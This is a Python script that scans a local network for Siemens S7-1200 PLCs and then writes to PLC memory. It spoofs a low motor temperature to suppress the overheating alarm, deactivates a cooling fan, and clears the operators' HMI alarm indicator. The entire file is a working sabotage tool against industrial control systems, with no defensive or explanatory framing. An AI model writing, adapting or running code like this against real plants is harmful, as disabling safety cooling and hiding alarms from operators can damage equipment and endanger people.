import snap7
import socket
import struct
import time
from scapy.all import ARP, Ether, srp

# Memory addresses related to alarms (Modify based on actual PLC addresses & tags)
OVERHEATING_ALARM_ADDR = 7  # MW7 (Motor Temperature)
ACTIVATE_FAN_B_ADDR = 0  # M0.1 (Activate Fan B)
MASTER_FAN_HMI_ADDR = 5  # M0.5 (Master Fan B HMI)

# Function to find Siemens PLC in network
def find_plc_ip():
    ip_range = "192.168.1.1/24"  # Adjust based on actual PLC network range
    print("[*] Scanning network for Siemens PLC...")
    
    request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_range)
    answered, _ = srp(request, timeout=2, verbose=False)
    
    for _, response in answered:
        ip = response.psrc
        print(f"[+] Checking IP: {ip}")
        
        # Try to establish a simple Snap7 connection to verify if it's a PLC
        client = snap7.client.Client()
        try:
            client.connect(ip, 0, 1)  # Rack 0, Slot 1 (Common for S7-1200)
            if client.get_connected():
                print(f"[✔] Siemens S7-1200 PLC found at {ip}")
                client.disconnect()
                return ip
        except:
            continue
    
    print("[!] No Siemens PLC found on the network.")
    return None

# Function to modify alarm settings in PLC
def modify_alarm_settings(plc_ip):
    client = snap7.client.Client()

    try:
        client.connect(plc_ip, 0, 1)
        
        if client.get_connected():
            print(f"[>] Connected to PLC at {plc_ip}")

            # Step 1: Overwrite overheating check memory
            print("[~] Suppressing Overheating Alarm...")
            new_temp_value = struct.pack(">h", 250)  # Change Motor Temp to safe value < 300
            client.db_write(OVERHEATING_ALARM_ADDR, 2, new_temp_value)

            # Step 2: Disable fan activation by modifying associated BOOL tags
            print("[~] Disabling Fan B Activation & Master Fan Alarm...")
            client.write_area(snap7.types.Areas.MK, ACTIVATE_FAN_B_ADDR, bytearray([0]))  # Deactivate Fan B
            client.write_area(snap7.types.Areas.MK, MASTER_FAN_HMI_ADDR, bytearray([0]))  # Disable alarm HMI indicator

            time.sleep(1)

            print("[✔] Alarm settings modified successfully.")
    except Exception as e:
        print(f"[!] Error modifying PLC memory: {e}")
    finally:
        client.disconnect()

if __name__ == "__main__":
    plc_ip = find_plc_ip()
    if plc_ip:
        modify_alarm_settings(plc_ip)